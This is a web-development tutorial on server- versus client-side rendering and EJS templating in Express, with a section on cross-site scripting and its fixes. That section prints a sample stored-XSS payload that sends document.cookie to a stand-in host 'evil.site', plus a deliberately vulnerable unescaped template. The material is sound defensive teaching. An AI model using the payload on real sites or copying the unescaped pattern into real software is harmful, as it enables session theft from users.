01
Server-Side vs Client-Side Rendering
Every page ends up as HTML. The real question is who builds it.

Whatever stack you use, the browser can only show HTML, CSS and JavaScript. So for every page, someone has to take your data (products, users, orders) and turn it into HTML. There are two places that can happen.

Key Concept

Server-Side Rendering (SSR) — the server fetches the data, builds the complete HTML page with the data already inside, and sends the finished page. The browser just displays it.

Client-Side Rendering (CSR) — the server sends an almost empty HTML file plus a JavaScript bundle. The browser runs the JS, calls an API for the data (JSON), and builds the page itself.

Think of a restaurant. SSR is the kitchen cooking your thali and serving it ready to eat. CSR is the waiter handing you a meal kit — raw ingredients plus a recipe — and you cook it at your table. Both end with food. One makes you wait longer before the first bite, and makes your stove do the work.

What the browser actually receives

Here is the first response for the same products page, built both ways. This is exactly what you see in View Page Source.

02
The Problems with Client-Side Rendering
Why the industry started moving HTML back to the server

Every React + Vite app you have built so far is CSR. It is great for app-like experiences — dashboards, chat, editors — but it comes with real costs that show up as your app and your audience grow.

1 · The blank screen

Until JavaScript downloads, runs, and gets data back from the API, the user is staring at a white screen (or a spinner). Every step below has to finish before the next one starts — this chain is called a request waterfall.

GET /products → index.html arrives (empty #root)
    ↓ screen: blank
download bundle.js (React + your code + every library)
    ↓ screen: blank
parse & run JS → React mounts, shows a spinner
    ↓ screen: spinner
fetch('/api/products') → wait for JSON
    ↓
render the list → user finally sees content ✅

And it often gets worse: a component renders, then fetches its data, then its child renders and fetches its data. Each level adds another round trip.

2 · Slow on budget phones and patchy networks

In CSR, the user's device does the rendering work. On a fast laptop with Wi-Fi you won't notice. On a budget Android phone on spotty mobile data — which is a lot of your real users in India — a big bundle means seconds of waiting before anything appears.

3 · SEO and link previews

Search engines and social apps read your HTML to understand a page. With CSR the raw HTML has no content and the same <title> on every route.

  • Google can run JavaScript, but it does it in a delayed second pass. Content that depends on JS gets indexed slower and less reliably.
  • Link preview bots (WhatsApp, LinkedIn, X, Slack, Discord) mostly read the raw HTML and don't run JavaScript. Share your CSR product page and the preview shows a generic title with no product image.

4 · Nothing works without JavaScript

If the bundle fails to load — a network blip, a CDN issue, a script error in production — the user sees nothing at all. With SSR, the content is already in the HTML, so the page is still readable.

5 · Bundles keep growing

Every library you npm install for the frontend (charts, date pickers, animation, icons) ships to every user. Bundle size creeps up release after release, and so does the blank-screen time.

💡

SSR isn't free either. Your server does work on every request, every navigation is a full page reload, and rich interactivity needs extra JavaScript. That's why modern frameworks don't pick one side — they mix both (Section 4).

03
How EJS Works
One template, endless pages — and why modern products moved beyond it
Key Concept

EJS (Embedded JavaScript) is a templating engine for Node.js. You write normal HTML and drop JavaScript inside special <% %> tags. On every request, the server runs the template with your data and produces a plain HTML string. The browser never sees EJS — only the finished HTML.

When you open Swiggy, there isn't a separate HTML file for every user. There is one template, and your name, orders and address get filled into it before the page is sent. That's templating.

The journey of one request

Browser requests GET /products
A normal HTTP request — a link click, typing the URL, or submitting a form.
Your route handler gets the data
Query MongoDB, call a service, read the session — exactly like any other route.
res.render('products', { products })
Instead of res.json(), you hand the data to a template.
EJS compiles the template into a JS function
It reads views/products.ejs and turns it into a function. With NODE_ENV=production, Express caches compiled views so this happens once.
The function runs with your data → HTML string
Loops run, conditions are checked, values are escaped and pasted in.
Express sends it as text/html → browser paints
The response is a complete page. No JSON, no fetch, no bundle needed to see content.

What EJS turns your template into

There's no magic. EJS converts your template into a function that builds a string. A simplified version:

You write
views/hello.ejs
<h1>Hello <%= name %></h1>
<% if (isAdmin) { %>
  <a href="/admin">Admin panel</a>
<% } %>
EJS builds (simplified)
compiled function
function template(locals) {
  let html = '';
  html += '<h1>Hello ';
  html += escape(locals.name);
  html += '</h1>\n';
  if (locals.isAdmin) {
    html += '<a href="/admin">Admin panel</a>\n';
  }
  return html;
}

Text outside the tags is copied as it is. Code inside <% %> becomes real JavaScript. That's why you can use any JS you already know — if, for, .map(), toUpperCase() — inside a template.

So why don't modern products use EJS?

EJS is SSR in its simplest form. It solves the blank-screen and SEO problems well. But the products you use every day — Swiggy, Instagram, Notion — need things classic templating can't give easily:

NeedClassic EJSModern frameworks (Next.js etc.)
Moving between pagesEvery click reloads the whole pageClient-side navigation, no full reload ✓
Interactive UIWrite separate vanilla JS and wire the DOM by handComponents with state ✓
Reusable UIPartials only — no props, state or lifecycleComponent ecosystem (UI kits, forms, charts) ✓
Web + mobile appHTML is useless to an Android app — you still need a JSON APIOne API serves web and mobile ✓
Team structureViews and backend logic in one Express appFrontend and backend teams ship independently ✓
Type safetyTemplates aren't type-checked; typos fail at runtimeTypeScript across components ✓

Where EJS still makes sense

Use caseWhy EJS fits
Email templates"Hi Riya, your order #4521 is confirmed." Render the HTML with ejs.renderFile() and send it with Nodemailer. Emails can't run React anyway.

04
How Rendering Works Today
SSR for the first paint, CSR for interactivity — the best of both

Modern frameworks don't force you to pick SSR or CSR. The usual pattern: render the HTML on the server so the first paint is fast and SEO works, then let JavaScript take over in the browser so the app feels smooth.

Rendering strategies you'll hear about

StrategyWhen the HTML is builtGreat for
CSRIn the browser, after JS runsDashboards and apps behind a login, where SEO doesn't matter
SSROn the server, on every requestPersonalised or always-changing pages: feeds, carts, search results
SSG (Static Site Generation)Once, at build timeBlogs, docs, marketing pages — served instantly from a CDN
ISR (Incremental Static Regeneration)At build time, then rebuilt in the background every N secondsProduct pages: mostly static, updated now and then
Streaming SSROn the server, sent in chunks as each part is readyPages where one slow section shouldn't block the rest

Three ideas that make it work

Hydration

The server sends ready HTML (fast first paint). Then the browser downloads the React code and attaches event handlers and state to that existing HTML. The page becomes interactive without being rebuilt from scratch.

React Server Components

Some components run only on the server — they can query the database directly and send zero JavaScript to the browser. Only interactive parts (buttons, forms, modals) ship JS. This is the default in the Next.js App Router.

Islands architecture

The page is static HTML, with small islands of interactivity (a carousel, a cart button) that load their own JS. Popularised by Astro — ideal for content-heavy sites.

What teams use for SSR today

FrameworkBuilt onKnown for
Next.jsReactThe most common choice in React jobs. SSR, SSG, ISR, streaming and Server Components in one framework.
React RouterReact"Framework mode" is what used to be Remix: server loaders and actions, built around standard web forms.
TanStack StartReactType-safe routing with server functions and streaming SSR.
NuxtVueThe Next.js equivalent for Vue.
SvelteKitSvelteSmall bundles, SSR by default.
Astroany UI libraryContent sites. Ships zero JS by default and uses islands for interactive parts.

  return (
    <ul>

    </ul>

Making CSR faster (when you stay with React + Vite)

Not every app needs SSR. A dashboard behind a login doesn't care about SEO. For those, you optimise the CSR side:

TechniqueWhat it does
Code splittingSplit the bundle per route with React.lazy() + dynamic import(). Users only download the page they open.
Skeleton screensShow the shape of the page while data loads. It doesn't make things faster, but it feels faster than a spinner.
Data cachingTanStack Query or SWR cache API responses, so going back to a page doesn't refetch everything.
PrefetchingLoad the next page's code and data when the user hovers over a link, before they click.
CDN for assetsServe the JS bundle and images from servers close to the user.
Lighter bundlesImport only what you use, replace heavy libraries, lazy-load images with loading="lazy" and serve WebP/AVIF.
App.jsx — route-level code splitting
import { lazy, Suspense } from 'react';

// Dashboard code is downloaded only when this route is visited
const Dashboard = lazy(() => import('./pages/Dashboard'));

export default function App() {
  return (
    <Suspense fallback={<DashboardSkeleton />}>
      <Dashboard />
    </Suspense>
  );
}

Step 1 — Create the project
Terminal
mkdir ejs-demo && cd ejs-demo
npm init -y
npm install express ejs
Step 2 — Folder structure

Express looks for templates in a views folder. Static files (CSS, images, browser JS) go in public.

Project structure
ejs-demo/
├── app.js
├── package.json
├── public/              ← served as-is to the browser
│   └── css/
│       └── style.css
└── views/               ← EJS templates (never sent raw)
    ├── home.ejs
    └── partials/        ← reusable pieces (Section 10)
Step 3 — Tell Express to use EJS
app.js
const express = require('express');
const path = require('path');

const app = express();

// 1. Use EJS as the template engine
app.set('view engine', 'ejs');

// 2. Where the templates live
app.set('views', path.join(__dirname, 'views'));

// 3. Serve CSS, images and browser JS from /public
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.render('home', { name: 'Ankur' });
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
SettingValue usedWhat it does
view engine'ejs'Which engine renders templates. It also lets you write res.render('home') without the .ejs extension.
viewspath.join(__dirname, 'views')Folder where templates live. The default is views inside the folder you ran node from — setting it explicitly avoids "Failed to lookup view" errors.
express.static'public'Files in public are served directly: public/css/style.css → /css/style.css.
💡

You never write require('ejs'). Express loads it for you based on the view engine name. You only need it installed.

views/home.ejs

06
Rendering a Page
res.render() and passing data from the route to the template
Key Concept

res.render(view, data) finds the template, runs it with data, and sends the resulting HTML. Every key in the data object becomes a variable inside the template. The template can only see what you pass — nothing sneaks in.

ArgumentExampleMeaning
view'profile'File path inside views, without .ejs. Sub-folders work: 'products/list' → views/products/list.ejs.
data{ user, skills }A plain object. Each key becomes a variable in the template.
app.js
app.get('/profile', (req, res) => {
  const user = { name: 'Riya Sharma', role: 'Backend Developer', city: 'Bhopal' };
  const skills = ['Node.js', 'Express', 'MongoDB', 'Redis'];

  res.render('profile', { user, skills });
});
views/profile.ejs
<h1><%= user.name %></h1>
<p><%= user.role %> · <%= user.city %></p>
<p>Knows <%= skills.length %> technologies</p>

Real data from MongoDB

The route is a normal Express route — you query the database first, then render. Exactly like you'd do before res.json().

routes/product.routes.js
app.get('/products', async (req, res) => {
  const products = await Product.find().sort({ createdAt: -1 }).lean();
  res.render('products/list', { title: 'All Products', products });
});

app.get('/products/:id', async (req, res) => {
  const product = await Product.findById(req.params.id).lean();
  if (!product) {
    return res.status(404).render('404', { title: 'Not found' });
  }
  res.render('products/detail', { title: product.name, product });
});

.lean() returns plain JS objects instead of full Mongoose documents — lighter and faster when you only need to display data.

Missing variables crash the render

⚠️

If a template uses <%= error %> and the route didn't pass error, the render fails with ReferenceError: error is not defined and the user gets a 500 error page.

For optional values, read them through locals — an object EJS gives every template that holds all the data you passed. Reading a missing key from an object is just undefined, not a crash:

views/login.ejs
<% if (locals.error) { %>
  <p class="error"><%= error %></p>
<% } %>

render vs send vs json

MethodSendsUse when
res.render()HTML built from a templateServer-rendered pages ✓
res.json()JSON dataAPIs for React or mobile apps
res.send()A string, buffer or object as it isQuick tests and plain text

The Four Tags
Print safely, run logic, print raw HTML, leave notes

Everything in EJS is done with four tags. Learn which one prints and which one doesn't, and you know 90% of EJS.

TagNamePrints?Use it for
<%= %>Escaped outputYes, safelyPrinting any value — your default choice. HTML characters are converted so they display as text.
<% %>Logic onlyNoif, for, variables — JavaScript that controls the page but prints nothing itself.
<%- %>Unescaped outputYes, rawinclude() and HTML you wrote. Never for user input.
<%# %>CommentNoNotes for developers. Removed on the server — never reaches the browser.
<%= %> — escaped output
views/tags.ejs
<h2>Welcome, <%= user.name %></h2>
<p>Total: ₹<%= cart.total.toLocaleString('en-IN') %></p>
<p>Items: <%= cart.items.length %></p>
<% %> — logic only
views/tags.ejs
<% const firstName = user.name.split(' ')[0]; %>
<% if (cart.items.length > 0) { %>
  <p>Hey <%= firstName %>, ready to check out?</p>
<% } %>
<%- %> — unescaped output
views/tags.ejs
<%- include('partials/header') %>

<% const badge = '<span class="badge">PRO</span>'; %>
<p>Plan: <%- badge %></p>   <%# HTML we wrote ourselves → safe %>
<%# %> — comment
views/tags.ejs
<%# TODO: show discount banner after the sale API is ready %>
<!-- HTML comment: this one IS sent to the browser -->

See the difference in the output

Template
<% const msg = '<b>Hello</b>'; %>
<p><%= msg %></p>
<p><%- msg %></p>
<%# you won't see this %>
HTML sent to the browser
<p>&lt;b&gt;Hello&lt;/b&gt;</p>   <!-- shows the text: <b>Hello</b> -->
<p><b>Hello</b></p>               <!-- shows bold: Hello -->
⚠️

Don't print logic. <%= if (user) { %> fails with a SyntaxError — <%= expects a value to print, not a statement. Use <% %> for if, for and closing braces.

💡

Cleaner output: logic tags leave blank lines in the HTML. End a tag with -%> to remove the newline after it, or use <%_ _%> to strip the whitespace around it. It only affects how View Page Source looks, not what the user sees.

08
Cross-Site Scripting (XSS)
Why one wrong tag can hand your users' accounts to an attacker
Key Concept

XSS happens when an attacker gets their JavaScript to run in other users' browsers on your website. The browser can't tell your scripts from theirs — if it's in the HTML your server sent, it runs with full access to the page.

How the attack happens

Attacker saves a "bio" containing a script
<script>fetch('https://evil.site/steal?c=' + document.cookie)</script>
Your server stores it in MongoDB
To the database it's just a string. Nothing looks wrong.
A victim opens the attacker's profile
The template prints the bio with <%- bio %> — raw, unescaped.
The victim's browser runs the script
Their cookies, session or data go to the attacker. The script can also click buttons, change the page, or show a fake login form — as the victim.

The fix is one character

Vulnerable
views/profile.ejs
<p class="bio"><%- user.bio %></p>
HTML sent
<p class="bio"><script>alert("hacked")</script></p>
<!-- the browser RUNS this -->
Safe
views/profile.ejs
<p class="bio"><%= user.bio %></p>
HTML sent
<p class="bio">&lt;script&gt;alert(&#34;hacked&#34;)&lt;/script&gt;</p>
<!-- the browser SHOWS this as text -->

<%= %> converts the five characters that have special meaning in HTML into HTML entities. The browser displays them as characters instead of treating them as code:

CharacterBecomesWhy it matters
<&lt;Can't open a tag like <script>
>&gt;Can't close a tag
"&#34;Can't break out of an attribute like value="…"
'&#39;Same, for single-quoted attributes
&&amp;Can't sneak in entities of its own

Where escaping is not enough

      

        
⚠️

        
Links: <a href="<%= user.website %>"> with a website of javascript:alert(1) passes through escaping untouched — there's nothing to escape. Clicking the link runs the code. Validate URLs on the server and only accept ones that start with http:// or https://.

      

      

        
⚠️

        
Inside <script> tags: const user = <%- JSON.stringify(user) %>; breaks if any value contains </script> — the attacker closes your script and opens their own. Escape it: JSON.stringify(user).replace(/</g, '\\u003c'), or pass data in a data- attribute with <%= %>.

      


      
Rules to follow

      
    
        
  1. Default to <%= %> for every value. Pick <%- %> only when you can say why.
    2. 
        
  2. <%- %> is only for include() and HTML your own code produced — never data from a user, a URL, a form or a third-party API.
    3. 
        
  3. If users must submit formatted text (a blog editor, rich comments), clean it on the server with a sanitizer library like sanitize-html before saving, and only then print it raw.
    4. 
        
  4. Add layers: set session cookies as httpOnly so JavaScript can't read them, and send a Content-Security-Policy header (the helmet package helps) to block inline scripts.
    5.

Plain JavaScript inside logic tags — HTML in between

        

      


      
There's no special EJS syntax for conditions or loops. You write normal JavaScript inside <% %>, and the HTML between the tags becomes the body of the if or the loop.

<% } %>

<% } else if (order.status === 'shipped') { %>

💡

        
Templates display, routes decide. Filtering, sorting, formatting prices and calculating totals belong in the route or a service — pass the finished values to the template. If a template has more JavaScript than HTML, move that logic out.

Partials

          
Write the navbar once, use it on every page

        

      


      
Your site has 10 pages, and every page has the same <head>, navbar and footer. Copy-paste them, and changing one link means editing 10 files — and you will miss one. Partials are small EJS files that other templates include.


      
Step 1 — Create the partials


views/
views/
├── partials/
│   ├── header.ejs         ← doctype, <head>, navbar
│   ├── footer.ejs         ← footer, closing tags
│   └── product-card.ejs   ← one reusable card
├── home.ejs
└── products/
    └── list.ejs


views/partials/header.ejs
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title><%= title %> · Shop</title>
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>
  <nav>
    <a href="/" class="<%= locals.active === 'home' ? 'active' : '' %>">Home</a>
    <a href="/products" class="<%= locals.active === 'products' ? 'active' : '' %>">Products</a>
  </nav>
  <main>


views/partials/footer.ejs
  </main>
  <footer>© <%= new Date().getFullYear() %> Shop</footer>
</body>
</html>


      
Step 2 — Include them in a page


views/home.ejs
<%- include('partials/header', { title: 'Home', active: 'home' }) %>

  <h1>Welcome to the shop</h1>
  <p>New drops every Friday.</p>

<%- include('partials/footer') %>


      

        
Why <%- and not <%=?

        
include() returns a string of HTML. With <%= that HTML gets escaped, and your page would literally show <nav><a href=... as text. The header is HTML you wrote, so raw output is safe here — this is the main legitimate use of <%-.

      


      
Passing data to a partial

      
    
        
  • A partial automatically sees everything the page received from res.render(). If the route passed user, the header can use user.
    • 
        
  • The second argument of include() adds extra values just for that partial: { title: 'Home', active: 'home' }.
    • 
        
  • For values that some pages pass and others don't (like active), read them with locals.active so pages without it don't crash.
    • 
      


      
Partials as components

      
Partials aren't only for headers. Pull a repeated block into its own file and include it inside a loop — the closest thing EJS has to a component:


views/partials/product-card.ejs
<article class="card">
  <img src="<%= product.image %>" alt="<%= product.name %>" loading="lazy">
  <h3><%= product.name %></h3>
  <p class="price">₹<%= product.price %></p>
  <a href="/products/<%= product._id %>">View details</a>
</article>


views/products/list.ejs
<%- include('../partials/header', { title: 'Products', active: 'products' }) %>

  <section class="grid">
    <% products.forEach(product => { %>
      <%- include('../partials/product-card', { product }) %>
    <% }) %>
  </section>

<%- include('../partials/footer') %>


      

        
💡

        
Paths are relative to the current file. views/home.ejs uses 'partials/header', but views/products/list.ejs is one folder deeper, so it needs '../partials/header'.

      

      

        
⚠️

        
Old tutorials use <% include partials/header %>. That syntax was removed in EJS v3 and now throws a compile error. Always use the function form: <%- include('partials/header') %>.
